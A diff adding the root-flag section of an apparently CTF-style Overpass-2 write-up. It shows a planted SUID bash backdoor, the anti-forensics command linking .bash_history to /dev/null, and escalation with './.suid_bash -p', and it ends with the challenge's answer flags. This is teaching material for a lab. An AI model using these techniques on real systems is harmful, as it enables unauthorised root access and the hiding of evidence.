@@ -277,3 +277,136 @@ thm{d119b4fa8c497ddb0525f7ad200e6567}
 ```
 
 Answer Q3: thm{d119b4fa8c497ddb0525f7ad200e6567}
+
+## Q4 What's the root flag?
+
+First off just looking through files and folders immediately around the access used in Q3. Just looking at permissions to files and folders in the /home/james directory we find three files immediately of interest in this directory:
+- The suid bit set on the .suid_bash hidden file.
+- While .suid_as_admin_successful has no content is likely a flag to highlight your in right directory look deeper here.
+- The attacker replaced .bash_history with a symlink to /dev/null. Anything Bash tries to write to history is discarded. This is a classic attacker anti-forensics technique.
+- .bash_history is a file that is normally found in linux.
+
+First here is a ls -la results for /home/james directory after I will explain the symlink:
+```
+james@overpass-production:/home/james$ ls -la
+total 1136
+drwxr-xr-x 7 james james    4096 Jul 22  2020 .
+drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
+lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
+drwx------ 2 james james    4096 Jul 21  2020 .cache
+drwx------ 3 james james    4096 Jul 21  2020 .gnupg
+drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
+-rw------- 1 james james      51 Jul 21  2020 .overpass
+-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
+-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
+-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
+drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
+-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
+drwxrwxr-x 7 james james    4096 Jul 21  2020 www
+james@overpass-production:/home/james$ 
+```
+
+How attackers create a .bash_history → /dev/null symlink
+- This is a classic anti‑forensics trick.
+- The attacker simply replaces the normal .bash_history file with a symbolic link that points to /dev/null.
+
+The command is:
+```
+ln -sf /dev/null ~/.bash_history
+```
+Breakdown:
+- ln -s → create symbolic link
+- -f → force overwrite if .bash_history already exists
+- /dev/null → the “black hole” device
+- ~/.bash_history → where Bash normally writes command history
+
+## A closer look at the .suid_bash script file using head command:
+
+The .suid_bash file on closer inspection is a compiled 64‑bit Linux ELF executable, not a script, not text, and not “obfuscated” — just raw machine code from a SUID backdoor binary used in the Overpass‑2 challenge.
+
+Below is top of the file using head command. Based on the bytes you showed:
+- It begins with the ELF magic header
+- It contains the dynamic loader path: /lib64/ld-linux-x86-64.so.2
+- It contains GNU build‑ID sections (GNUGNU)
+- It contains binary machine code, which your terminal renders as �
+
+This confirms:
+- It is a 64‑bit dynamically linked ELF executable
+- It was compiled with the GNU toolchain
+- It is not obfuscated — it’s just binary
+- It matches the malicious SUID backdoor from Overpass‑2
+- Note head tries to interpret binary bytes as UTF-8 and fail thats why there are:
+   - \ufffd replacement characters
+   - Random symbols
+   - Broken control bytes
+   - Normal for a compiled program
+
+```
+/home/james$ heahead .suid_bash
+ELF> @\ufffd\ufffd@8	@@@\ufffd884 \ufffd=\ufffd=0\ufffd=0\u0537xS 0f0f00fTTTDDP\ufffdtd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdB\ufffdBQ\ufffdtdR\ufffdtd\ufffd=\ufffd=0\ufffd=0p2p2/lib64/ld-linux-x86-64.so.2GNUGNU\ufffd=z\ufffd"lf04R\ufffd\ufffd\ufffd\ufffd\ufffd-\ufffd\ufffd	00
+     #!Jzd\ufffd\ufffdAP\ufffdDDB \ufffd	\ufffd\ufffd@\ufffdAJ\ufffd\ufffd!Ih\ufffda"r\ufffd
+NL\ufffd@@@\ufffdAB
+\ufffd0\ufffdI\ufffd\ufffd\ufffdq\ufffd(\ufffdh@\ufffd(\ufffd\ufffd
+                 H &RD!D 
+                         \ufffd\ufffd $DJ\ufffd\ufffdP`
+\ufffd @A\ufffd4`@ABd L\ufffd0 d\ufffdP\ufffdCDB\ufffd@\ufffdE % 32B\ufffdX\ufffd\ufffd\ufffd@T\ufffd\ufffdD$\ufffd 
+\ufffd\ufffd @A\ufffd%
+\ufffd
+\ufffd!0`0 	@@ \ufffdb\ufffdBh
+               HB\ufffdH\ufffd\ufffd
+\ufffdXq\ufffd@\ufffd\ufffd\ufffd \ufffd\ufffdY         \ufffd`1B\ufffd
+BdH\ufffd(0\ufffd"BB1@\ufffd
+             p2
+ s\ufffd0 \ufffd"\ufffd\ufffdBi\ufffd\ufffd$DF\ufffd0"\ufffd )4\ufffd\ufffd\ufffd\ufffd$
+=\ufffdHdL@\ufffd\ufffd\ufffd0\ufffd( 0D@kBD\ufffd\ufffdH`\ufffd$yh\ufffd\ufffd@(\ufffd\ufffd>\ufffd5\ufffdR\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd@!\ufffd%) PH\ufffd\ufffd\ufffd\ufffd
+bP\ufffdAbB\ufffdP@\ufffd\ufffdL\ufffd.<\ufffdB@&J\ufffdD0\ufffd8`
+                          \ufffdPP0D\ufffd\ufffd\ufffd``
+                                     \ufffd\ufffdH\ufffd\ufffd`\ufffd\ufffdP3\ufffd0!\ufffd \ufffdBL 9E$!( B\ufffdD@"\ufffd@@\ufffd \ufffdXDB\ufffd\ufffd\ufffd\ufffdQ\ufffd(\ufffd
+h\ufffd@\ufffd\ufffd\ufffd#\ufffd6A`\ufffd\ufffd/\ufffd#(
+                 G8\ufffd0\ufffdDÐP
+james@overpass-production:/home/james$ 
+```
+## Back to finding the root flag for Q4 of task 3
+
+Comparison of without and with the .suid_bash script exploit used to gain access to root.
+
+First without fails as expected to root folder as james does not have permissions:
+```
+james@overpass-production:/home/james$ id
+uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+james@overpass-production:/home/james$ cd /root
+bash: cd: /root: Permission denied
+```
+
+Now just trying the .suid_bash file and I realise something was missing the -p. 
+- As soon as the script file runs it revers back to james permissions, 
+- -p is required to maintain the suid permissions throughout use:
+```
+james@overpass-production:/home/james$ ./.id
+uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+james@overpass-production:/home/james$ ./.suid_bash   
+.suid_bash-4.4$ cd /root
+.suid_bash: cd: /root: Permission denied
+.suid_bash-4.4$ id
+uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+.suid_bash-4.4$ 
+```
+Now with the -p: 
+- The kernal still configures uid and gid same for james
+- The however euid=o(root) same for egid, -p preserves the euid and egid, its then possible to operate with root permissions to access the root directory contents:
+```
+james@overpass-production:/home/james$ ./.suid_bash -p
+.suid_bash-4.4# id      
+uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)
+.suid_bash-4.4# cd /root
+.suid_bash-4.4# pwd
+/root
+.suid_bash-4.4# ls
+root.txt
+.suid_bash-4.4# cat root.txt
+thm{d53b2684f169360bb9606c333873144d}
+.suid_bash-4.4# 
+```
+Answer Q4: thm{d53b2684f169360bb9606c333873144d}
